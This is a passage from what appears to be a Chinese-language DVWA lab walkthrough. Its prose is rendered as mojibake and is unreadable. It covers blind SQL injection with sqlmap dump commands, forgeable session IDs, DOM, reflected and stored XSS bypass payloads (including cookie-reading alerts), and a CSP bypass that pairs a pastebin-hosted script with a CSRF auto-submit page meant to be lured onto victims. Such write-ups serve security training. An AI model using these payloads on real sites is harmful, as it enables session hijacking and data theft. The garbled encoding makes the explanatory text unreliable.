-T users --dump --batch High ä¸åŒç‚¹åœ¨äºidçš„ä½ç½®æ¢æˆäº†cookieï¼Œä½†ä»ç„¶æ²¡æœ‰åšå‡ºæœ‰æ•ˆçš„é™åˆ¶ï¼Œä¾æ—§å¯ä»¥sqlmap python3 sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/\" --cookie \"id=1*; security=high; PHPSESSID=cp58onvdgg0k61kihafkofof9j\" -D dvwa -T users --dump --batch Impossible è¿™ä¸€ç­‰çº§åŒæ ·é‡‡ç”¨äº†PDOçš„SQLé¢„ç¼–è¯‘ã€é˜²æ­¢CSRFï¼Œæ£€æŸ¥idæ˜¯å¦ä¸ºæ•°å­—å‹ã€‚ 0x09 Weak Session IDs ä¸€ç§é€šè¿‡çªƒå–ç”¨æˆ·SessionIDï¼Œä½¿ç”¨è¯¥SessionIDç™»å½•è¿›ç›®æ ‡è´¦æˆ·çš„æ”»å‡»æ–¹æ³•ï¼Œæ­¤æ—¶æ”»å‡»è€…å®é™…ä¸Šæ˜¯ä½¿ç”¨äº†ç›®æ ‡è´¦æˆ·çš„æœ‰æ•ˆSessionã€‚å¦‚æœSessionIDæ˜¯ä¿å­˜åœ¨Cookieä¸­çš„ï¼Œåˆ™è¿™ç§æ”»å‡»å¯ä»¥ç§°ä¸ºCookieåŠ«æŒã€‚ SessionIDè¿˜å¯ä»¥ä¿å­˜åœ¨URLä¸­ï¼Œä½œä¸ºä¸€ä¸ªè¯·æ±‚çš„ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼çš„å®‰å…¨æ€§éš¾ä»¥ç»å—è€ƒéªŒã€‚ Low &lt;?php $html = \"\"; if ($_SERVER['REQUEST_METHOD'] == \"POST\") { if (!isset ($_SESSION['last_session_id'])) { $_SESSION['last_session_id'] = 0; } $_SESSION['last_session_id']++; $cookie_value = $_SESSION['last_session_id']; setcookie(\"dvwaSession\", $cookie_value); } ?&gt; è¿™é‡Œçš„ä»£ç é€»è¾‘æ˜¯ï¼Œåªè¦postæ–¹æ³•è¯·æ±‚ä¸€æ¬¡ï¼Œå°±ä¼šä»¤session_id++ï¼Œå½“ç„¶å¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œç½®é›¶ã€‚ è¿™å¾ˆå®¹æ˜“è®©æ”»å‡»è€…ä¼ªé€ cookieï¼Œæˆ‘ä»¬è¿™é‡ŒbpæŠ“åŒ…ä¸€æ¬¡å‘ç°å¦‚ä¸‹ å½“æˆ‘ä»¬å°†è¿™ä¸ªcookieå¤åˆ¶ä¸‹æ¥ï¼Œç„¶åæ¢ä¸€ä¸ªæµè§ˆå™¨è®¿é—®è¯¥weak_session_idå¯¹åº”çš„urlï¼Œä¼šå‘ç°ä¸éœ€è¦ç™»å½•ç›´æ¥å°±åˆ°è¾¾æŒ‡å®šurlé¡µé¢ Medium &lt;?php $html = \"\"; if ($_SERVER['REQUEST_METHOD'] == \"POST\") { $cookie_value = time(); setcookie(\"dvwaSession\", $cookie_value); } ?&gt; è¿™é‡Œæ˜¯é‡‡ç”¨æ—¶é—´æˆ³ä½œä¸ºsessionä¼šè¯ï¼Œä½†æ˜¯è¿™é‡Œæ—¶é—´æˆ³ä¹Ÿæ˜¯æœ‰è§„å¾‹å¯å¾ªçš„ï¼Œæ˜¯å¯ä»¥ä¼ªé€ çš„ã€‚æˆ‘ä»¬é‡‡ç”¨æ—¶é—´æˆ³è½¬æ¢å·¥å…·ï¼š https://tool.lu/timestamp/ è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€‰ä¸€ä¸ªæœªæ¥çš„æ—¶é—´ï¼Œå¹¶è½¬æ¢ä¸ºæ—¶é—´æˆ³ï¼Œæ¥ç€æˆ‘ä»¬å¯ä»¥è¯±éª—ç”¨æˆ·åœ¨è¿™ä¸€æ—¶é—´ç‚¹å‡»è¿™ä¸€å…³çš„generateæŒ‰é’® å½“å…¶ç‚¹å‡»è¿‡ä¹‹åï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æˆåŠŸè¿›è¡Œä¼ªé€ äº† Cookie: dvwaSession=1705061825; security_level=0; ajs_anonymous_id=f11e1270-bf66-42b5-b337-91c6d4d5ff4f; ajs_user_id=048546bfc1e19205a55a5993547bc9308acf5a9c; ocKey=512389862aecb2132976ffe9960380f4; PHPSESSID=mc4bn9ou74faqboqg56aag47t0; security=medium å°†æˆ‘ä»¬å‡†å¤‡çš„æ—¶é—´æˆ³ä¼ªé€ æˆcookieï¼Œæ¥ç€æ¢ä¸€ä¸ªå…¶ä»–æµè§ˆå™¨å‘é€ï¼Œå³å¯ç»•è¿‡ç™»å½• High &lt;?php $html = \"\"; if ($_SERVER['REQUEST_METHOD'] == \"POST\") { if (!isset ($_SESSION['last_session_id_high'])) { $_SESSION['last_session_id_high'] = 0; } $_SESSION['last_session_id_high']++; $cookie_value = md5($_SESSION['last_session_id_high']); setcookie(\"dvwaSession\", $cookie_value, time()+3600, \"/vulnerabilities/weak_id/\", $_SERVER['HTTP_HOST'], false, false); } ?&gt; è¿™é‡Œä¸ç¬¬ä¸€ä¸ªlowçº§åˆ«ç±»ä¼¼ï¼Œä¸è¿‡è¿™é‡Œçš„sessionç»è¿‡äº†md5åŠ å¯†ã€‚æˆ‘ä»¬bpæŠ“åŒ…çš„æ—¶å€™å¯ä»¥å¾ˆå®¹æ˜“çœ‹å‡ºæ¥md5çš„è¿¹è±¡çš„ï¼Œç»è¿‡ä¸€ä¸ªè§£å¯†å³å¯çŸ¥é“æ˜¯ç”±æ•°å­—0å¼€å§‹++ä¹‹åå¾—åˆ°çš„æ•´æ•°çš„md5åŠ å¯†å€¼ï¼Œä¾æ—§å¾ˆå®¹æ˜“æ„é€  Impossible &lt;?php $html = \"\"; if ($_SERVER['REQUEST_METHOD'] == \"POST\") { $cookie_value = sha1(mt_rand() . time() . \"Impossible\"); setcookie(\"dvwaSession\", $cookie_value, time()+3600, \"/vulnerabilities/weak_id/\", $_SERVER['HTTP_HOST'], true, true); } ?&gt; è¿™é‡Œè®¾ç½®äº†éšæœºæ•°ï¼Œç„¶åæ‹¼æ¥å½“å‰æ—¶é—´æˆ³å’Œimpossibleï¼Œæœ€åç»è¿‡sha1åŠ å¯†ï¼Œå¦‚æœæˆ‘ä»¬ä¸èƒ½å¾—åˆ°éšæœºæ•°ç§å­ï¼Œä»¥åŠåé¢çš„Impossibleå­—ç¬¦ï¼Œæ˜¯æ ¹æœ¬æ— æ³•æ„é€ çš„ã€‚ è¿™åªæ˜¯ä»£ç å®¡è®¡çš„å‰æä¸‹æ‰çŸ¥é“å…¶æ„é€ åŸç†ï¼Œå¦‚æœå•çº¯æŠ“åŒ…ç­‰ç­‰ï¼ŒåŸºæœ¬ä¸å¯èƒ½åˆ¤æ–­å‡ºæ¥å…¶sessionäº§ç”ŸåŸç†ã€‚ 0x10 XSS(DOM) Low &lt;?php # No protections, anything goes ?&gt; æ— ä»»ä½•ä¿æŠ¤ã€‚ã€‚ã€‚ã€‚ æˆ‘ä»¬çœ‹ä¸€ä¸‹é¡µé¢å…³äºæ­¤å¤„çš„htmlæºç  &lt;div class=\"vulnerable_code_area\"&gt; &lt;p&gt;Please choose a language:&lt;/p&gt; &lt;form name=\"XSS\" method=\"GET\"&gt; &lt;select name=\"default\"&gt; &lt;script&gt; if (document.location.href.indexOf(\"default=\") &gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(\"default=\")+8); document.write(\"&lt;option value='\" + lang + \"'&gt;\" + $decodeURI(lang) + \"&lt;/option&gt;\"); document.write(\"&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;\"); } document.write(\"&lt;option value='English'&gt;English&lt;/option&gt;\"); document.write(\"&lt;option value='French'&gt;French&lt;/option&gt;\"); document.write(\"&lt;option value='Spanish'&gt;Spanish&lt;/option&gt;\"); document.write(\"&lt;option value='German'&gt;German&lt;/option&gt;\"); &lt;/script&gt; &lt;/select&gt; &lt;input type=\"submit\" value=\"Select\" /&gt; &lt;/form&gt; &lt;/div&gt; å¾ˆæ˜æ˜¾è¿™é‡Œå¯¹ç”¨æˆ·çš„è¾“å…¥å¤åˆ¶ç»™äº†langå˜é‡ï¼Œæ¥ç€åœ¨æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„æƒ…å†µä¸‹ç›´æ¥è¿›è¡Œurlè§£ç æ‹¼æ¥åˆ°document.writeå‡½æ•°ä¸‹ Medium &lt;?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) { $default = $_GET['default']; # Do not allow script tags if (stripos ($default, \"&lt;script\") !== false) { header (\"location: ?default=English\"); exit; } } ?&gt; è¿™é‡Œè¿‡æ»¤äº†&lt;scriptæ ‡ç­¾ï¼Œä½†æˆ‘ä»¬è¿˜å¯ä»¥é€‰æ‹©æ›´å¤šçš„æ ‡ç­¾æ¥ç»•è¿‡ ?default=&lt;img src=1 onerror=alert('hacker')&gt; ä½†æ¯•ç«Ÿæˆ‘ä»¬æ¢äº†æ ‡ç­¾ï¼Œå¿…é¡»è¦é—­åˆå‰é¢çš„æ ‡ç­¾ï¼Œå¦åˆ™è¿™é‡Œçš„imgæ ‡ç­¾ä¾¿ä¸èµ·ä½œç”¨äº† é—­åˆoptionä¸selectæ ‡ç­¾å³å¯ ?default=&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert('hacker')&gt; High &lt;?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) { # White list the allowable languages switch ($_GET['default']) { case \"French\": case \"English\": case \"German\": case \"Spanish\": # ok break; default: header (\"location: ?default=English\"); exit; } } ?&gt; è¿™é‡Œè¯´å¦‚æœdefaultçš„å€¼ä¸æ˜¯ä¸Šé¢å››ä¸ªæŒ‡å®šçš„å€¼ä¸­çš„ä¸€ä¸ªï¼Œåˆ™ç›´æ¥æ— æ•ˆï¼Œè¿™é‡Œå­¦äº†å¸ˆå‚…ä»¬çš„ä¸¤ä¸ªæ€è·¯ æ–¹æ³•ä¸€ï¼šå¯ä»¥ä½¿ç”¨ &amp; è¿æ¥å¦ä¸€ä¸ªè‡ªå®šä¹‰å˜é‡æ¥ Bypass ?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert('XSS')&gt; ?default=English&amp;a=&lt;input onclick=alert('XSS') /&gt; æ–¹æ³•äºŒï¼šä½¿ç”¨#æ¥ Bypass æ³¨ï¼šåœ¨urlä¸­#åè¾¹çš„å†…å®¹ä¸ä¼šå‘é€åˆ°æœåŠ¡ç«¯ï¼Œä»è€Œå¯ä»¥å®ç°ç»•è¿‡ã€‚ ?default=English#&lt;/option&gt;&lt;/select&gt;&lt;BODY ONLOAD=alert(document.cookie)&gt; ?default=English#&lt;input onclick=alert('document.cookie') /&gt; Impossible &lt;?php # Don't need to do anything, protection handled on the client side ?&gt; å¯ä»¥çœ‹è§å®¢æˆ·ç«¯è¿™é‡Œå¯¹æˆ‘ä»¬çš„è¾“å…¥çš„æ•°æ®ä¸è¿›è¡Œurlè§£ç äº†ï¼Œè¿™æ ·ä¼šå¯¼è‡´æ ‡ç­¾å¤±æ•ˆï¼Œä»è€Œæ— æ³• XSS 0x11 XSS(Reflected) Low &lt;?php header (\"X-XSS-Protection: 0\"); // Is there any input? if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) { // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; } ?&gt; è¿™é‡Œåªæ˜¯åˆ¤æ–­æ˜¯å¦å­˜åœ¨nameå˜é‡ï¼Œå¦‚æœå­˜åœ¨ç›´æ¥æ’å…¥æ ‡ç­¾ä¸­ï¼Œä¸å­˜åœ¨ä»»ä½•è¿‡æ»¤ &lt;script&gt;alert('hacker')&lt;/script&gt; Medium &lt;?php header (\"X-XSS-Protection: 0\"); // Is there any input? if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) { // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello {$name}&lt;/pre&gt;\"; } ?&gt; å°†è¿‡æ»¤ä¸ºç©ºï¼Œè¿™æ„å‘³ç€å¯ä»¥å¤§å†™æˆ–è€…åŒå†™ç»•è¿‡ &lt;s&lt;script&gt;cript&gt;alert(&#x27;hacker&#x27;)&lt;/script&gt; &lt;Script&gt;cript&gt;alert(&#x27;hacker&#x27;)&lt;/script&gt; High &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; è¿‡æ»¤å¾ˆå…¨ï¼Œå°†æ ‡ç­¾ä¸­çš„æ¯ä¸ªå­—ç¬¦éƒ½è¿‡æ»¤äº†ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶ä»–æ ‡ç­¾ &lt;img src=1 onerror=alert(&#x27;hacker&#x27;) &lt;a href = &#x27;javascript:alert(&#x27;hacker&#x27;)&#x27;&gt;click&lt;/a&gt; Impossible &lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $name = htmlspecialchars( $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;/pre&gt;&quot;; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; é˜²æ­¢CSRFï¼Œæ¥ç€é‡‡ç”¨htmlspecialcharsæœç»äº†ç‰¹æ®Šå­—ç¬¦ï¼š è¿™æ„å‘³ç€æˆ‘ä»¬çš„ä»»ä½•äº‹ä»¶æ ‡ç­¾éƒ½å°†æ— ç”¨ 0x12 XSS(Stored) Low &lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );//å¯¹å­—ç¬¦ä¸²æ”¶å°¾å»ç©º $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message );//å–å‡ºåå¼•å· $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; å¯ä»¥çœ‹è§å¯¹ç”¨æˆ·çš„è¾“å…¥åœ¨ç»è¿‡å‡ ä¸ªå‡½æ•°çš„å¤„ç†åï¼Œæ’å…¥äº†æ•°æ®åº“ï¼Œä½†å¹¶æœªåšå‡ºå¯¹xssçš„è¿‡æ»¤ï¼Œä½†é˜²æ­¢SQLæ³¨å…¥ &lt;script&gt;alert(&#x27;hacker&#x27;)&lt;/script&gt; å¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬æ’å…¥ä¸Šè¿°æ•°æ®çš„æ—¶å€™ï¼Œæ¯å½“æˆ‘ä»¬è®¿é—®æ­¤é¡µé¢ï¼Œä¾¿ä¼šæ‰§è¡Œxss Medium &lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; å¯ä»¥çœ‹åˆ°è¿™å›å¯¹messageåšå‡ºäº†æˆåŠŸçš„è¿‡æ»¤ï¼Œä½†å´å¿˜è®°æ­£ç¡®è¿‡æ»¤nameï¼Œåªæ˜¯å°†æ ‡ç­¾æ›¿æ¢ä¸ºç©º ä½†è¿™é‡Œç”±äºå¯¹Nameè¿™ä¸€æ–‡æœ¬æ¡†æœ‰å­—æ•°é™åˆ¶ï¼Œä½†æˆ‘ä»¬å¯ä»¥æ”¾åˆ°bpä¸Šï¼Œæˆ–è€…ç›´æ¥F12åœ¨htmlä¸­ç›´æ¥ä¿®æ”¹ å¯ä»¥çœ‹åˆ°æˆåŠŸXSSï¼Œç±»ä¼¼paylaodè¿˜æœ‰ï¼š &lt;sc&lt;script&gt;ript&gt;alert(XSS)&lt;/script&gt; &lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt; å½“ç„¶è¿˜å¯ä»¥ï¼šå®¡æŸ¥å…ƒç´ æ‰‹åŠ¨å°† maxlength çš„å€¼è°ƒå¤§ä¸€ç‚¹å°±å¯ä»¥äº†ã€‚ High &lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; è¿™é‡ŒåŒæ ·å¯¹messageåšå‡ºäº†ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œä½†å¯¹nameåªæ˜¯å•çº¯è¿‡æ»¤äº†æ ‡ç­¾ï¼Œè¿™å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ Impossible &lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27; ); $data-&gt;bindParam( &#x27;:message&#x27;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &#x27;:name&#x27;, $name, PDO::PARAM_STR ); $data-&gt;execute(); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; é˜²æ­¢CSRFï¼ŒSQLæ³¨å…¥ï¼ŒåŒæ—¶å¯¹messageä¸nameçš„å†…å®¹éƒ½åšå‡ºäº†ç›¸åŒä¸”ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œè¿™æ˜¯æ— æ³•ç»•è¿‡çš„ 0x13 CSP Bypass å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ä½¿æœåŠ¡å™¨ç®¡ç†å‘˜å¯ä»¥é€šè¿‡æŒ‡å®šæµè§ˆå™¨åº”è®¤ä¸ºæ˜¯å¯æ‰§è¡Œè„šæœ¬çš„æœ‰æ•ˆæºçš„åŸŸæ¥å‡å°‘æˆ–æ¶ˆé™¤XSSå¯èƒ½å‘ç”Ÿçš„å‘é‡ã€‚ç„¶åï¼Œå…¼å®¹CSPçš„æµè§ˆå™¨å°†ä»…æ‰§è¡Œä»è¿™äº›å…è®¸åˆ—å‡ºçš„åŸŸæ¥æ”¶çš„æºæ–‡ä»¶ä¸­åŠ è½½çš„è„šæœ¬ï¼Œå¿½ç•¥æ‰€æœ‰å…¶ä»–è„šæœ¬ï¼ˆåŒ…æ‹¬å†…è”è„šæœ¬å’Œäº‹ä»¶å¤„ç†HTMLå±æ€§ï¼‰ã€‚ é™¤äº†é™åˆ¶å¯ä»¥ä»ä¸­åŠ è½½å†…å®¹çš„åŸŸä¹‹å¤–ï¼ŒæœåŠ¡å™¨è¿˜å¯ä»¥æŒ‡å®šå…è®¸ä½¿ç”¨å“ªäº›åè®®; ä¾‹å¦‚ï¼ˆç†æƒ³æƒ…å†µä¸‹ï¼Œä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼‰ï¼ŒæœåŠ¡å™¨å¯ä»¥æŒ‡å®šå¿…é¡»ä½¿ç”¨HTTPSåŠ è½½æ‰€æœ‰å†…å®¹ã€‚å®Œæ•´çš„æ•°æ®ä¼ è¾“å®‰å…¨ç­–ç•¥ä¸ä»…åŒ…æ‹¬å¼ºåˆ¶HTTPSè¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œè¿˜åŒ…æ‹¬ä½¿ç”¨å®‰å…¨æ ‡è®°æ ‡è®°æ‰€æœ‰cookieï¼Œå¹¶æä¾›ä»HTTPé¡µé¢åˆ°å…¶HTTPSå¯¹åº”é¡¹çš„è‡ªåŠ¨é‡å®šå‘ã€‚ç«™ç‚¹è¿˜å¯ä»¥ä½¿ç”¨Strict-Transport-SecurityHTTPæ ‡å¤´æ¥ç¡®ä¿æµè§ˆå™¨ä»…é€šè¿‡åŠ å¯†é€šé“è¿æ¥åˆ°å®ƒä»¬ã€‚ ä¸¤ç§æ–¹æ³•å¯ä»¥å¯ç”¨ CSPã€‚ ä¸€ç§æ˜¯é€šè¿‡ HTTP å¤´ä¿¡æ¯çš„Content-Security-Policyçš„å­—æ®µã€‚ ä¸€ç§æ˜¯é€šè¿‡ç½‘é¡µçš„æ ‡ç­¾ Low &lt;?php $headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics. header($headerCSP); # These might work if you can&#x27;t create your own for some reason # https://pastebin.com/raw/R570EE00 # https://www.toptal.com/developers/hastebin/raw/cezaruzeka ?&gt; &lt;?php if (isset ($_POST[&#x27;include&#x27;])) &#123; $page[ &#x27;body&#x27; ] .= &quot; &lt;script src=&#x27;&quot; . $_POST[&#x27;include&#x27;] . &quot;&#x27;&gt;&lt;/script&gt; &quot;; &#125; $page[ &#x27;body&#x27; ] .= &#x27; &lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt; &lt;/form&gt; &#x27;; è¿™é‡Œå¯ä»¥çœ‹åˆ°ç½‘ç«™é€šè¿‡æ·»åŠ HTTPå¤´ä¿¡æ¯çš„Content-Security-Policyçš„å­—æ®µæ¥å¼€å¯CSPï¼šè¦æ±‚æœ¬é¡µé¢åªèƒ½åŠ è½½æ¥è‡ªè‡ªèº«çš„æˆ–è€…pastebin.com, hastebin.com, jquery and google analytics.è¿™äº›ç½‘ç«™çš„jsè„šæœ¬ä»£ç  å…¶ä¸­ pastebin.com æ˜¯ä¸€ä¸ªå¿«é€Ÿåˆ†äº«æ–‡æœ¬å†…å®¹çš„ç½‘ç«™ï¼Œè¿™ä¸ªå†…å®¹æˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œå¯ä»¥åœ¨è¿™é‡Œé¢æ’å…¥ XSS æ”»å‡»è¯­å¥ï¼š https://pastebin.com/raw/dtZzx4TF æˆ‘ä»¬åœ¨ä¸Šè¿°ç½‘ç«™æ„é€ XSSè¯­å¥ï¼Œä¹‹åè®°å½•ä¸‹ç”Ÿæˆçš„ç½‘å€ï¼Œæ¥ç€æ”¾å…¥DVWAçš„æ–‡æœ¬è¾“å…¥æ¡†ä¸­ï¼Œç‚¹å‡»includeå³å¯è§¦å‘XSSï¼Œä½†æˆ‘è¿™é‡Œä¸çŸ¥ä¸ºä½•æ²¡æœ‰ååº” è¿™é‡Œè¿˜å¯ä»¥é…åˆ CSRF è®©æ”»å‡»æ›´åŠ è‡ªåŠ¨åŒ–ï¼š &lt;form method=&quot;POST&quot; action=&quot;http://127.0.0.1:8888/vulnerabilities/csp/&quot; id=&quot;csp&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot;&gt; &lt;/form&gt; &lt;script&gt; var form = document.getElementById(&quot;csp&quot;); form[0].value=&quot;https://pastebin.com/raw/ZFnbmjBU&quot;; form.submit(); &lt;/script&gt; å°†ä¸Šè¿°å†…å®¹ä¿å­˜ä¸º csrf.html ç„¶åä¸Šä¼ åˆ°å…¬ç½‘æœåŠ¡å™¨ä¸Š https://www.yourwebsite.com/csrf.html å°†è¿™ä¸ªåœ°å€æƒ³æ–¹è®¾æ³•è®©å—å®³è€…è®¿é—®çš„è¯ï¼Œå°±ä¼šè‡ªåŠ¨è§¦å‘ CSRF å’Œ XSS 